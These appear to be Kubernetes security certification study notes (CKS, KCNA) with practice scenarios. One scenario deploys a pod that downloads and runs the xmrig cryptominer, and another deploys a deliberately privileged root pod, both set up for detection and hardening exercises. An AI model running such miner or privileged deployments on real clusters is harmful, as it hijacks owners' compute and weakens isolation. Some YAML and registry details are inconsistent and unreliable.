<li>To scan an image with syft and export the results to a file in SPDX format:
<pre><code>syft scan docker.io/kodekloud/webapp-color:latest -o spdx --file /root/webapp-spdx.sbom
</code></pre>
</li>
</ul>
<h3 id="grype"><a class="header" href="#grype">Grype</a></h3>
<ul>
<li>Grype is a tool (also from Anchore) that can be used to scan SBOM for vulnerabilities</li>
<li>To scan a SBOM with Grype:
<pre><code>grype /root/webapp-sbom.json -o json --file /root/grype-report.json
</code></pre>
</li>
</ul>
<h3 id="kube-linter"><a class="header" href="#kube-linter">Kube-linter</a></h3>
<ul>
<li>Kube-linter can be used to lint Kubernetes manifests and ensure best practices are being followed</li>
<li>kube-linter is configurable. You can disable/enable checks and even create your own custom checks</li>
<li>kube-linter includes recommendations for how to fix failed checks</li>
<li>https://github.com/stackrox/kube-linter</li>
</ul>
<h2 id="scanning-images-for-vulnerabilities"><a class="header" href="#scanning-images-for-vulnerabilities">Scanning Images for Vulnerabilities</a></h2>
<h3 id="trivy"><a class="header" href="#trivy">trivy</a></h3>
<ul>
<li>trivy can be used to scan images, git repos, and filesystems for vulnerabilities</li>
<li>https://github.com/aquasecurity/trivy</li>
<li>Example:
<pre><code>  sudo docker run --rm  aquasec/trivy:0.17.2 nginx:1.16-alpine
</code></pre>
</li>
</ul>
<h1 id="6-monitoring-logging-and-runtime-security"><a class="header" href="#6-monitoring-logging-and-runtime-security">6 Monitoring, Logging, and Runtime Security</a></h1>
<h2 id="falco"><a class="header" href="#falco">falco</a></h2>
<ul>
<li>Falco is an IDS for Kubernetes workloads</li>
<li>falco is a cloud native security tool. It provides near real-time threat detection for cloud, container, and Kubernetes workloads by leveraging runtime insights. Falco can monitor events defined via customizable rules from various sources, including the Linux kernel, and enrich them with metadata from the Kubernetes API server, container runtime, and more. Falco supports a wide range of kernel versions, x86_64 and ARM64 architectures, and many different output channels.</li>
<li>falco uses sydig filters to extract information about an event. They are configured in the falco rules.yaml or configmap. They can also be passed via helm values.
<ul>
<li><code>/etc/falco/falco.yaml</code> - the main configuration file for falco</li>
<li><code>/etc/falco/falco_rules.yaml</code> - the main rules file for falco</li>
</ul>
</li>
<li>falco rule files consist of 3 elements defined in YAML:
<ul>
<li>rules - a rule is a condition under which an alert should be generated</li>
<li>macros - a macro is a reusable rule condition. These help keep the rules file clean and easy to read</li>
<li>lists - a collection of items that can be used in rules and macros</li>
</ul>
</li>
<li>Some examples of events that falco watches for:
<ul>
<li>Reading or writing files at a specific location in the filesystem</li>
<li>Opening a shell binary for a container, such as /bin/bash</li>
<li>Sending/receives traffic from undesired URLs</li>
</ul>
</li>
<li>Falco deploys a set of sensors that listen for configured events and conditions
<ul>
<li>Each sensor contains a set of rules that map an event to a data source.</li>
<li>An alert is produced when a rule matches a specific event</li>
<li>Alerts are then sent to an output channel to record the event</li>
</ul>
</li>
</ul>
<h2 id="ensuring-container-immutability"><a class="header" href="#ensuring-container-immutability">Ensuring Container Immutability</a></h2>
<ul>
<li>Containers should be immutable. This means that once a container is created, it should not be changed. If changes are needed, a new container should be created.</li>
<li>Containers are mutable (changeable) by default. This can lead to security vulnerabilities.</li>
<li>To ensure container immutability:
<ul>
<li>Use a ‚Äòdistroless‚Äô container image. These images are minimal and contain only the necessary components to run an application. They do not include a shell.</li>
<li>Use a ‚Äòread-only‚Äô file system. This prevents changes to the file system. To configure a read-only file system, add the following to the pod spec:
<pre><code>spec:
  containers:
  - name: my-container
    image: my-image
    securityContext:
      readOnlyRootFilesystem: true
</code></pre>
</li>
</ul>
</li>
</ul>
<h2 id="audit-logs"><a class="header" href="#audit-logs">Audit Logs</a></h2>
<ul>
<li>Auditing involves recording and tracking all events and actions within the cluster</li>
<li>Who made a change, when was it changed, and what exactly was changed</li>
<li>Audit logs provide a chronological record of activities within a cluster</li>
<li>Entries in the audit log exist in ‚ÄòJSON Lines‚Äô format. Note that this is not the same as JSON. Each line in the log is a separate JSON object.</li>
<li>Types of Audit Policies:
<ul>
<li>None - no logging</li>
<li>Metadata - Logs request metadata, but not request or response body</li>
<li>Request - Logs request metadata and request body, but no response body</li>
<li>Request/Response - Logs the metadata, request body, and response body</li>
</ul>
</li>
</ul>
<h3 id="sample-audit-policy"><a class="header" href="#sample-audit-policy">Sample Audit Policy</a></h3>
<pre><code>```
apiVersion: audit.k8s.io/v1 # This is required.
kind: Policy
omitStages:
  - "RequestReceived"
rules:
  # Log pod changes at RequestResponse level
  - level: RequestResponse
    resources:
    - group: ""
      # Resource "pods" doesn't match requests to any subresource of pods,
      # which is consistent with the RBAC policy.
      resources: ["pods"]
  # Log "pods/log", "pods/status" at Metadata level
  - level: Metadata
    resources:
    - group: ""
      resources: ["pods/log", "pods/status"]

  # Don't log requests to a configmap called "controller-leader"
  - level: None
    resources:
    - group: ""
      resources: ["configmaps"]
      resourceNames: ["controller-leader"]

  # Don't log watch requests by the "system:kube-proxy" on endpoints or services
  - level: None
    users: ["system:kube-proxy"]
    verbs: ["watch"]
    resources:
    - group: "" # core API group
      resources: ["endpoints", "services"]

  # Don't log authenticated requests to certain non-resource URL paths.
  - level: None
    userGroups: ["system:authenticated"]
    nonResourceURLs:
    - "/api*" # Wildcard matching.
    - "/version"

  # Log the request body of configmap changes in kube-system.
  - level: Request
    resources:
    - group: "" # core API group
      resources: ["configmaps"]
    # This rule only applies to resources in the "kube-system" namespace.
    # The empty string "" can be used to select non-namespaced resources.
    namespaces: ["kube-system"]

  # Log configmap and secret changes in all other namespaces at the Metadata level.
  - level: Metadata
    resources:
    - group: "" # core API group
      resources: ["secrets", "configmaps"]

  # Log all other resources in core and extensions at the Request level.
  - level: Request
    resources:
    - group: "" # core API group
    - group: "extensions" # Version of group should NOT be included.

  # A catch-all rule to log all other requests at the Metadata level.
  - level: Metadata
    # Long-running requests like watches that fall under this rule will not
    # generate an audit event in RequestReceived.
    omitStages:
      - "RequestReceived"
```
</code></pre>
<ul>
<li>Once the audit policy has been defined, you can apply it to the cluster by passing the <code>--audit-policy-file</code> flag to the kube-apiserver</li>
<li>To use a file-based log backend, you need to pass 3 configurations to the kube-apiserver:
<ul>
<li><code>--audit-policy-file</code> - this is the path to the audit policy file</li>
<li><code>--audit-log-path</code> - this is the path to the audit log file</li>
<li>both of these paths needs to be mounted in the kube-apiserver. The kube-apiserver cannot read these files on the node without a proper <code>volumeMount</code></li>
</ul>
</li>
</ul>
</h4>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="kubernetes-security-specialist-cks-practice-scenarios"><a class="header" href="#kubernetes-security-specialist-cks-practice-scenarios">Kubernetes Security Specialist (CKS) Practice Scenarios</a></h1>
<h2 id="scenario-1-prevent-privilege-escalation"><a class="header" href="#scenario-1-prevent-privilege-escalation">Scenario 1: Prevent Privilege Escalation</a></h2>
<p><strong>Objective</strong>: Ensure a pod cannot escalate privileges or run as root.</p>
<h3 id="problem-statement"><a class="header" href="#problem-statement">Problem Statement:</a></h3>
<p>You have been given a pod specification that allows a container to run as root. Your task is to:</p>
<ol>
<li>Modify the pod spec to ensure it runs as a non-root user.</li>
<li>Apply a <strong>PodSecurityPolicy</strong> (if using older versions) or <strong>Pod Security Admission</strong> (PSA) to enforce this restriction.</li>
</ol>
<p>Pod spec to modify:</p>
<pre><code>cat &lt;&lt; EOF | kubectl create -f -
apiVersion: v1
kind: Pod
metadata:
  name: insecure-pod
  labels:
    app: insecure
spec:
  containers:
  - name: insecure-container
    image: busybox
    command: ["sleep", "3600"]
    securityContext:
      privileged: true  # Allows full access to the host (needs to be removed)
      runAsUser: 0      # Runs as root (needs to be changed)
      capabilities:
        add: ["NET_ADMIN", "SYS_ADMIN"]  # Grants unnecessary capabilities
EOF
</code></pre>
<details>
<summary>üí° Hints</summary>
<ul>
<li>Use <code>securityContext.runAsNonRoot: true</code></li>
<li>Use <code>securityContext.capabilities.drop: ["ALL"]</code></li>
<li>If using <strong>PSA</strong>, enforce the <code>restricted</code> profile.</li>
</ul>
</details>
<h3 id="expected-outcome"><a class="header" href="#expected-outcome">Expected Outcome:</a></h3>
<ul>
<li>The pod should not run as root.</li>
<li>Any attempt to run a root-level container should be denied.</li>
</ul>
<hr>
<h2 id="scenario-2-detect-and-mitigate-a-cryptojacking-attack"><a class="header" href="#scenario-2-detect-and-mitigate-a-cryptojacking-attack">Scenario 2: Detect and Mitigate a Cryptojacking Attack</a></h2>
<p><strong>Objective</strong>: Identify and remove a malicious pod mining cryptocurrency.</p>
<h3 id="problem-statement-1"><a class="header" href="#problem-statement-1">Problem Statement:</a></h3>
<p>A newly deployed pod has been consuming a high amount of CPU resources without any declared resource limits. Upon investigation, it appears to be running a cryptomining process (<code>xmrig</code>). Your tasks:</p>
<ol>
<li>Identify the pod consuming excessive CPU.</li>
<li>Inspect the container and confirm it is mining cryptocurrency.</li>
<li>Mitigate the issue by removing the pod and applying security policies to prevent future attacks.</li>
</ol>
<p>Deploy a malicious pod:</p>
<pre><code>cat &lt;&lt; EOF | kubectl create -f -
apiVersion: v1
kind: Pod
metadata:
  name: cryptominer
  labels:
    app: cryptominer
spec:
  containers:
  - name: cryptominer-container
    image: ubuntu
    command: ["/bin/sh", "-c", "apt update &amp;&amp; apt install -y curl &amp;&amp; curl -sL https://github.com/xmrig/xmrig/releases/latest/download/xmrig -o /usr/local/bin/xmrig &amp;&amp; chmod +x /usr/local/bin/xmrig &amp;&amp; /usr/local/bin/xmrig"]
    resources:
      requests:
        cpu: "500m"
      limits:
        cpu: "2000m"
EOF
</code></pre>
<details>
<summary>üí° Hints</summary>
<ul>
<li>Use <code>kubectl top pod --sort-by=cpu</code> to find high CPU-consuming pods.</li>
<li>Use <code>kubectl exec -it &lt;pod&gt; -- ps aux</code> to check running processes.</li>
<li>Consider <strong>Network Policies</strong> to restrict outbound traffic.</li>
<li>Apply <strong>ResourceQuotas</strong> and <strong>LimitRanges</strong> to prevent overuse.</li>
</ul>
</details>
<h3 id="expected-outcome-1"><a class="header" href="#expected-outcome-1">Expected Outcome:</a></h3>
<ul>
<li>The malicious pod should be deleted.</li>
<li>Future unauthorized mining activities should be restricted using security policies.</li>
</ul>
<hr>
<h2 id="scenario-3-restrict-container-networking"><a class="header" href="#scenario-3-restrict-container-networking">Scenario 3: Restrict Container Networking</a></h2>
<p><strong>Objective</strong>: Implement a network policy to isolate an application from unauthorized access.</p>
<h3 id="problem-statement-2"><a class="header" href="#problem-statement-2">Problem Statement:</a></h3>
<p>Your application pod (<code>web-app</code>) should only communicate with the database (<code>db</code>) pod. Other pods should not be able to access <code>web-app</code>. Implement a <strong>NetworkPolicy</strong> to enforce this restriction.</p>
<pre><code>cat &lt;&lt; EOF | kubectl create -f -
apiVersion: v1
kind: Pod
metadata:
  name: web-app
  labels:
    app: web-app
spec:
  containers:
  - name: web-container
    image: nginx
    ports:
    - containerPort: 80
---
apiVersion: v1
kind: Pod
metadata:
  name: db
  labels:
    app: db
spec:
  containers:
  - name: db-container
    image: mysql
    ports:
    - containerPort: 3306
--- 
apiVersion: v1
kind: Pod
metadata:
  name: attacker
  labels:
    app: attacker
spec:
  containers:
  - name: attacker-container
    image: busybox
    command: ["sleep", "3600"]
EOF
</code></pre>
<details>
<summary>üí° Hints</summary>
<ul>
<li>Create a <code>NetworkPolicy</code> that allows traffic from <code>db</code> to <code>web-app</code>.</li>
<li>Deny all ingress traffic by default.</li>
<li>Use <code>kubectl run busybox --rm -it --image=busybox sh</code> to test connectivity.</li>
</ul>
</details>
<h3 id="expected-outcome-2"><a class="header" href="#expected-outcome-2">Expected Outcome:</a></h3>
<ul>
<li>Only <code>db</code> can communicate with <code>web-app</code>.</li>
<li>Any external pod trying to access <code>web-app</code> should be denied.</li>
</ul>
<hr>
<h2 id="scenario-4-protect-secrets-in-kubernetes"><a class="header" href="#scenario-4-protect-secrets-in-kubernetes">Scenario 4: Protect Secrets in Kubernetes</a></h2>
<p><strong>Objective</strong>: Ensure Kubernetes secrets are stored and accessed securely.</p>
<h3 id="problem-statement-3"><a class="header" href="#problem-statement-3">Problem Statement:</a></h3>
<p>An application pod is reading a Kubernetes secret (<code>db-password</code>). Your security audit revealed:</p>
<ol>
<li>The secret is mounted as a <strong>plain text environment variable</strong>.</li>
<li>Developers are retrieving secrets using <code>kubectl get secrets</code>.</li>
</ol>
<p>Your tasks:</p>
<ul>
<li>Modify the pod spec to <strong>mount the secret as a file</strong> instead of an environment variable.</li>
<li>Restrict access to secrets by applying <strong>RBAC policies</strong>.</li>
</ul>
<pre><code>cat &lt;&lt; EOF | kubectl create -f -
apiVersion: v1
kind: Secret
metadata:
  name: db-secret
type: Opaque
data:
  username: dXNlcg==  # Base64 encoded "user"
  password: c2VjdXJlcGFzcw==  # Base64 encoded "securepass"
---
apiVersion: v1
kind: Pod
metadata:
  name: insecure-pod
spec:
  containers:
  - name: app-container
    image: busybox
    command: [ "sh", "-c", "env | grep DB_" ]
    env:
    - name: DB_USERNAME
      valueFrom:
        secretKeyRef:
          name: db-secret
          key: username
    - name: DB_PASSWORD
      valueFrom:
        secretKeyRef:
          name: db-secret
          key: password
EOF
</code></pre>
<details>
<summary>üí° Hints</summary>
<ul>
<li>Use <code>volumeMounts</code> and <code>volumes</code> instead of <code>env</code>.</li>
<li>Implement <strong>RBAC</strong> to restrict access to <code>kubectl get secrets</code>.</li>
</ul>
</details>
<h3 id="expected-outcome-3"><a class="header" href="#expected-outcome-3">Expected Outcome:</a></h3>
<ul>
<li>The application still retrieves the secret, but in a more secure manner.</li>
<li>Unauthorized users cannot list secrets.</li>
</ul>
<hr>
<h2 id="scenario-5-detect-and-block-unauthorized-container-images"><a class="header" href="#scenario-5-detect-and-block-unauthorized-container-images">Scenario 5: Detect and Block Unauthorized Container Images</a></h2>
<p><strong>Objective</strong>: Restrict pod deployments to approved images only.</p>
<h3 id="problem-statement-4"><a class="header" href="#problem-statement-4">Problem Statement:</a></h3>
<p>A developer accidentally deployed an image from Docker Hub (<code>nginx:latest</code>) instead of using the company‚Äôs private registry (<code>registry.example.com/nginx:latest</code>). You need to:</p>
<ol>
<li>Detect and delete unauthorized images.</li>
<li>Implement Gatekeeper to enforce image restrictions.</li>
</ol>
<p>Steps:</p>
<ol>
<li>Deploy Gatekeeper</li>
</ol>
<pre><code>kubectl apply -f https://raw.githubusercontent.com/open-policy-agent/gatekeeper/v3.18.2/deploy/gatekeeper.yaml
</code></pre>
<ol start="2">
<li>
<p>Deploy a constraint template and constraint to restrict images:</p>
</li>
<li>
<p>Deploy non-compliant pod(s) and see the result:</p>
</li>
</ol>
<pre><code>cat &lt;&lt; EOF | kubectl create -f -
apiVersion: v1
kind: Pod
metadata:
  name: unauthorized-pod
  labels:
    app: unauthorized
spec:
  containers:
  - name: nginx-container
    image: nginx:latest
    ports:
    - containerPort: 80
EOF
</code></pre>
<details>
<summary>üí° Hints</summary>
<ul>
<li>Use <code>kubectl get pods -o jsonpath='{.items[*].spec.containers[*].image}'</code> to find all running images.</li>
<li>Install <strong>Gatekeeper</strong> with <strong>Open Policy Agent (OPA)</strong> to enforce policies.</li>
</ul>
</details>
<h3 id="expected-outcome-4"><a class="header" href="#expected-outcome-4">Expected Outcome:</a></h3>
<ul>
<li>Unauthorized images should be flagged and removed.</li>
<li>Only images from <code>whatever.registry.com</code> should be allowed.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="kcna"><a class="header" href="#kcna">KCNA</a></h1>
<h2 id="directory-map-14"><a class="header" href="#directory-map-14">Directory Map</a></h2>
<ul>
<li><a href="#kubernetes-certified-native-associate-kcna-notes">notes</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="kubernetes-certified-native-associate-kcna-notes"><a class="header" href="#kubernetes-certified-native-associate-kcna-notes">Kubernetes Certified Native Associate (KCNA) Notes</a></h1>
<p align="center"><img width="180" alt="portfolio_view" src="kubernetes/kcna/badge.png"></p>

<p align="center"><img width="300" alt="portfolio_view" src="kubernetes/kcna/kubernetes.png"></p>

<h4 align="center"><a href="https://www.cncf.io/certification/kcna/">https://www.cncf.io/certification/kcna/</a></h4>

<h1 align="center">Kubernetes Certified Native Associate (KCNA) Notes</h1>

<h2 id="table-of-contents-8"><a class="header" href="#table-of-contents-8">Table of Contents</a></h2>
<ul>
<li><a href="#exam-1">Exam</a>
<ul>
<li><a href="#outline-1">Outline</a></li>
<li><a href="#changes-1">Changes</a></li>
</ul>
</li>
<li><a href="#preparation-1">Preparation</a>
<ul>
<li><a href="#study-resources-1">Study Resources</a></li>
<li><a href="#practice-1">Practice</a></li>
</ul>
</li>
<li><a href="#kubernetes-fundamentals">Kubernetes Fundamentals</a>
<ul>
<li><a href="#pods">Pods</a></li>
<li><a href="#replicasets">ReplicaSets</a></li>
<li><a href="#deployments">Deployments</a></li>
<li><a href="#replicaset-vs-deployment">ReplicaSet vs Deployment</a></li>
<li><a href="#kubernetes-namespaces">Kubernetes Namespaces</a></li>
<li><a href="#imperative-vs-declarative">Imperative vs Declarative</a></li>
<li><a href="#scheduling">Scheduling</a></li>
<li><a href="#labels-and-selectors">Labels and Selectors</a></li>
<li><a href="#taints-and-tolerations">Taints and Tolerations</a></li>
<li><a href="#node-selectors">Node Selectors</a></li>
<li><a href="#node-affinity">Node Affinity</a></li>
<li><a href="#requests-and-limits">Requests and Limits</a></li>
<li><a href="#daemonsets">DaemonSets</a></li>
<li><a href="#static-pods">Static Pods</a></li>
<li><a href="#multiple-schedulers">Multiple Schedulers</a></li>
<li><a href="#authentication-2">Authentication</a></li>
<li><a href="#authorization-1">Authorization</a></li>
<li><a href="#api-groups">API Groups</a></li>
<li><a href="#role-based-access-control-rbac">Role-Based Access Control (RBAC)</a></li>
<li><a href="#service-accounts-1">Service Accounts</a></li>
</ul>
</li>
<li><a href="#container-orchestration">Container Orchestration</a>
<ul>
<li><a href="#cluster-networking">Cluster Networking</a></li>
<li><a href="#pod-networking">Pod Networking</a></li>
<li><a href="#cni">CNI</a></li>
<li><a href="#dns-1">DNS</a></li>
<li><a href="#ingress">Ingress</a></li>
<li><a href="#services">Services</a></li>
<li><a href="#sidecars">Sidecars</a></li>
<li><a href="#envoy">Envoy</a></li>
<li><a href="#storage">Storage</a></li>
</ul>
</li>
<li><a href="#cloud-native-architecture">Cloud Native Architecture</a>
<ul>
<li><a href="#autoscaling">Autoscaling</a></li>
<li><a href="#kubernetes-keps-and-sigs">Kubernetes KEPs and SIGs</a></li>
</ul>
</li>
<li><a href="#cloud-native-application-delivery">Cloud Native Application Delivery</a>
<ul>
<li><a href="#gitops">GitOps</a>
<ul>
<li><a href="#gitops-principles">GitOps Principles</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<!-- /code_chunk_output -->
<h1 id="exam-1"><a class="header" href="#exam-1">Exam</a></h1>
<h2 id="outline-1"><a class="header" href="#outline-1">Outline</a></h2>
<p>https://github.com/cncf/curriculum/blob/master/KCNA_Curriculum.pdf</p>
<h2 id="changes-1"><a class="header" href="#changes-1">Changes</a></h2>
<h1 id="preparation-1"><a class="header" href="#preparation-1">Preparation</a></h1>
<h2 id="study-resources-1"><a class="header" href="#study-resources-1">Study Resources</a></h2>
<p>https://learn.kodekloud.com/user/courses/kubernetes-and-cloud-native-associate-kcna
https://amazon.com/KCNA-Book-Kubernetes-Native-Associate/dp/1916585035</p>
<h2 id="practice-1"><a class="header" href="#practice-1">Practice</a></h2>
<p>https://learn.kodekloud.com/user/courses/kubernetes-and-cloud-native-associate-kcna
https://tutorialsdojo.com/kubernetes-and-cloud-native-associate-kcna-sample-exam-questions/</p>
<h1 id="kubernetes-fundamentals"><a class="header" href="#kubernetes-fundamentals">Kubernetes Fundamentals</a></h1>
<h2 id="pods"><a class="header" href="#pods">Pods</a></h2>
<ul>
<li>A pod is the smallest deployable unit in Kubernetes. A Pod represents a single instance of a running process in your cluster.</li>
<li>Pods deploy a container image on a Kubernetes cluster as a running instance of an application.</li>
<li>A pod can contain more than one container.
<ul>
<li>An example use case would be a pod that contains a web server and a sidecar container that collects logs for the web server container.</li>
</ul>
</li>
<li>A pod can be deployed by using kubectl or by creating a YAML manifest:
<ul>
<li>Kubectl example:</li>
</ul>
<pre><code>kubectl run my-pod --image=my-image
</code></pre>
<ul>
<li>YAML manifest example:</li>
</ul>
<pre><code>apiVersion: v1
kind: Pod
metadata:
  name: my-pod
spec:
- containers:
  - name: my-container
    image: my-image
</code></pre>
</li>
<li>You can view pods running in a cluster by using the following command:
<pre><code>kubectl get pods
</code></pre>
<ul>
<li>You can view detailed information about a pod by using the following command:</li>
</ul>
<pre><code>kubectl describe pod my-pod
</code></pre>
</li>
</ul>
<h2 id="replicasets"><a class="header" href="#replicasets">ReplicaSets</a></h2>
<ul>
<li>A ReplicaSet ensures that a specified number of pod replicas are running at any given time.</li>
<li>A ReplicaSet is defined by a YAML manifest that specifies the number of replicas to maintain.</li>
<li>A ReplicaSet can be deployed by creating a YAML manifest:
<ul>
<li>Kubectl example:</li>
</ul>
<pre><code>kubectl create -f my-replicaset.yaml
</code></pre>
</li>
<li>Replication Controllers are an older version of ReplicaSets and are being replaced.</li>
<li>You can view ReplicaSets running in a cluster by using the following command:
<pre><code>kubectl get replicaset
</code></pre>
<ul>
<li>You can view detailed information about a ReplicaSet by using the following command:</li>
</ul>
<pre><code>kubectl describe replicaset my-replicaset
</code></pre>
</li>
</ul>
<h2 id="deployments"><a class="header" href="#deployments">Deployments:</a></h2>
<ul>
<li>A Deployment is a higher-level concept that manages ReplicaSets and provides declarative updates to Pods along with a lot of other useful features.</li>
<li>A Deployment is defined by a YAML manifest that specifies the desired state of the deployment.</li>
<li>A Deployment can be deployed by creating a YAML manifest or imperatively using kubectl:
<ul>
<li>YAML example:</li>
</ul>
<pre><code>kubectl create -f my-deployment.yaml
</code></pre>
</li>
<li>You can view Deployments running in a cluster by using the following command:
<pre><code>kubectl get deployments
</code></pre>
</li>
<li>You can view detailed information about a Deployment by using the following command:
<pre><code>kubectl describe deployment my-deployment
</code></pre>
</li>
<li>Rolling updates can be performed on a Deployment by updating the Deployment‚Äôs YAML manifest and applying the changes:</li>
</ul>
<h2 id="replicaset-vs-deployment"><a class="header" href="#replicaset-vs-deployment">ReplicaSet vs Deployment:</a></h2>
<ul>
<li>ReplicaSets are a lower-level concept that manages Pods and ensures a specified number of pod replicas are running at any given time.</li>
<li>Deployments are a higher-level concept that manage ReplicaSets and provide declarative updates to Pods along with a lot of other useful features.</li>
</ul>
<h2 id="kubernetes-namespaces"><a class="header" href="#kubernetes-namespaces">Kubernetes Namespaces</a></h2>
<ul>
<li>Namespaces are a way to divide cluster resources between multiple users.</li>
<li>Namespaces can be used to organize resources and provide a way to scope resources.</li>
<li>Namespaces can be used to create resource quotas and limit the amount of resources a user can consume.</li>
<li>Namespaces can be used to create network policies and limit the network traffic between pods.</li>
<li>Namespaces can be used to create role-based access control (RBAC) policies and limit the permissions of users.</li>
</ul>
<h2 id="imperative-vs-declarative"><a class="header" href="#imperative-vs-declarative">Imperative vs Declarative</a></h2>
<ul>
<li>Imperative:
<ul>
<li>Imperative commands are used to perform a specific task.</li>
<li>An example of an imperative command would be to create a pod using kubectl run.</li>
<li>Imperative commands are useful for quick tasks and testing.</li>
</ul>
</li>
<li>Declarative:
<ul>
<li>Declarative commands are used to define the desired state of a resource.</li>
<li>An example of a declarative command would be to create a pod using a YAML manifest.</li>
<li>Declarative commands are useful for managing resources in a production environment.</li>
</ul>
</li>
</ul>
<h1 id="scheduling"><a class="header" href="#scheduling">Scheduling</a></h1>
<ul>
<li>Scheduling is the process of assigning pods to nodes in a Kubernetes cluster.</li>
<li>The Kubernetes scheduler is responsible for scheduling pods to nodes based on resource requirements and constraints.</li>
<li>The scheduler uses a set of policies to determine where to place pods in the cluster.</li>
<li>The scheduler can be configured to use different scheduling algorithms and policies.</li>
<li>The scheduler can be extended with custom scheduling plugins.</li>
<li>To schedule a pod, the scheduler evaluates the pod‚Äôs resource requirements, affinity and anti-affinity rules, taints and tolerations, and other constraints. It then selects a node that meets the requirements and assigns the pod to that node by updating the <code>spec.nodeName</code> field in the pod‚Äôs manifest.</li>
</ul>
<h2 id="labels-and-selectors"><a class="header" href="#labels-and-selectors">Labels and Selectors</a></h2>
<ul>
<li>Labels are key-value pairs that are attached to objects in Kubernetes.</li>
<li>Labels can be used to organize and select objects in Kubernetes.</li>
<li>Labels can be used to filter and group objects in Kubernetes.</li>
<li>Labels can be used to create selectors that match objects based on their labels.</li>
<li>Selectors are used to select objects in Kubernetes based on their labels.</li>
<li>Selectors can be used to filter objects based on their labels.</li>
<li>Selectors can be used to group objects based on their labels.</li>
<li>Selectors can be used to create sets of objects that match a specific label query.</li>
</ul>
<h2 id="taints-and-tolerations"><a class="header" href="#taints-and-tolerations">Taints and Tolerations</a></h2>
<ul>
<li>Taints are used to repel pods from nodes in a Kubernetes cluster.</li>
<li>We apply a taint to a node (as a key-value pair). Any pods that do not have a toleration for that taint will not be scheduled on that node.</li>
</ul>
<h2 id="node-selectors"><a class="header" href="#node-selectors">Node Selectors</a></h2>
<ul>
<li>Node selectors are used to constrain which nodes a pod is eligible to be scheduled based on labels on the node.</li>
<li>Node selectors are used to filter nodes based on their labels.</li>
<li>To use a node selector, you add a <code>nodeSelector</code> field to the pod‚Äôs spec that specifies a set of key-value pairs that must match the labels on the node.</li>
<li>Example:</li>
</ul>
<pre><code>apiVersion: v1
kind: Pod
metadata:
  name: my-pod
spec:
  containers:
  - name: my-container
    image: my-image
  nodeSelector:
    disktype: ssd
</code></pre>
<h2 id="node-affinity"><a class="header" href="#node-affinity">Node Affinity</a></h2>
<ul>
<li>Node affinity is a way to constrain which nodes a pod is eligible to be scheduled based on labels on the node.</li>
<li>Node affinity is similar to node selectors but provides more control over how pods are scheduled.</li>
<li>Node affinity can be used to specify required and preferred rules for node selection.</li>
<li>Node affinity can be used to specify rules that match or do not match nodes based on their labels.</li>
<li>Node affinity can be used to specify rules that match or do not match nodes based on their topology.</li>
<li>Example:</li>
</ul>
<pre><code>apiVersion: v1
kind: Pod
metadata:
  name: my-pod
spec:
  containers:
  - name: my-container
    image: my-image
  affinity:
    nodeAffinity:
      requiredDuringSchedulingIgnoredDuringExecution:
        nodeSelectorTerms:
        - matchExpressions:
          - key: disktype
            operator: In
            values:
            - ssd
</code></pre>
<h2 id="requests-and-limits"><a class="header" href="#requests-and-limits">Requests and Limits</a></h2>
<ul>
<li>Requests and limits are used to specify the amount of resources a pod requires and the maximum amount of resources a pod can consume.</li>
<li>Requests are used to specify the amount of resources a pod requires to run.</li>
<li>Limits are used to specify the maximum amount of resources a pod can consume.</li>
<li>Requests and limits can be specified for CPU and memory resources.</li>
<li>Requests and limits can be specified in the pod‚Äôs spec.</li>
<li>Example:</li>
</ul>
<pre><code>apiVersion: v1
kind: Pod
metadata:
  name: my-pod
spec:
  containers:
  - name: my-container
    image: my-image
    resources:
      requests:
        memory: "64Mi"
        cpu: "250m"
      limits:
        memory: "128Mi"
        cpu: "500m"
</code></pre>
<h2 id="daemonsets"><a class="header" href="#daemonsets">DaemonSets</a></h2>
<ul>
<li>DaemonSets are used to run a copy of a pod on all nodes in a Kubernetes cluster.</li>
<li>DaemonSets are used to run system daemons and other background tasks on all nodes.</li>
<li>DaemonSets are defined by a YAML manifest that specifies the pod template to use.</li>
<li>DaemonSets can be deployed by creating a YAML manifest:</li>
</ul>
<pre><code>apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: my-daemonset
spec:
  selector:
    matchLabels:
      app: my-daemonset
  template:
    metadata:
      labels:
        app: my-daemonset
    spec:
      containers:
      - name: my-container
        image: my-image
</code></pre>
<h2 id="static-pods"><a class="header" href="#static-pods">Static Pods</a></h2>
<ul>
<li>Static Pods are pods that are managed by the kubelet on a node.</li>
<li>Static Pods are defined by a file on the node‚Äôs filesystem.</li>
<li>Static Pods are not managed by the Kubernetes API server.</li>
<li>Static Pods are useful for running system daemons and other background tasks on a node.</li>
<li>Static Pods are defined by a file in the <code>/etc/kubernetes/manifests</code> directory on the node.</li>
<li>Static Pods are created and managed by the kubelet on the node.</li>
</ul>
<h2 id="multiple-schedulers"><a class="header" href="#multiple-schedulers">Multiple Schedulers</a></h2>
<ul>
<li>Kubernetes supports multiple schedulers that can be used to schedule pods in a cluster.</li>
<li>You can even create your own schedule and use it to schedule pods in a cluster.</li>
</ul>
<h2 id="authentication-2"><a class="header" href="#authentication-2">Authentication</a></h2>
<ul>
<li>Authentication is the process of verifying the identity of a user or system.</li>
<li>Kubernetes supports multiple authentication methods, including:
<ul>
<li>X.509 client certificates</li>
<li>Static tokens</li>
<li>Service accounts</li>
<li>OpenID Connect tokens</li>
<li>Webhook tokens</li>
</ul>
</li>
</ul>
<h2 id="authorization-1"><a class="header" href="#authorization-1">authorization</a></h2>
<ul>
<li>Authorization is the process of determining what actions a user or system is allowed to perform.</li>
<li>Kubernetes supports multiple authorization methods, including:
<ul>
<li>Role-based access control (RBAC)</li>
<li>Attribute-based access control (ABAC)</li>
</ul>
</li>
</ul>
<h2 id="api-groups"><a class="header" href="#api-groups">API Groups</a></h2>
<ul>
<li>API groups are used to organize resources in Kubernetes.</li>
<li>API groups are used to group related resources together.</li>
<li>API groups that you will commonly use:
<ul>
<li>core: Contains core resources like pods, services, and namespaces.</li>
<li>apps: Contains higher-level resources like deployments, replica sets, and stateful sets.</li>
<li>batch: Contains resources like jobs and cron jobs.</li>
<li>extensions: Contains deprecated resources like replica sets and daemon sets.</li>
<li>networking.k8s.io: Contains resources like network policies and ingresses.</li>
<li>storage.k8s.io: Contains resources like storage classes and persistent volume claims.</li>
<li>rbac.authorization.k8s.io: Contains resources like roles and role bindings.</li>
<li>metrics.k8s.io: Contains resources like pod metrics.</li>
<li>autoscaling: Contains resources like horizontal pod autoscalers.</li>
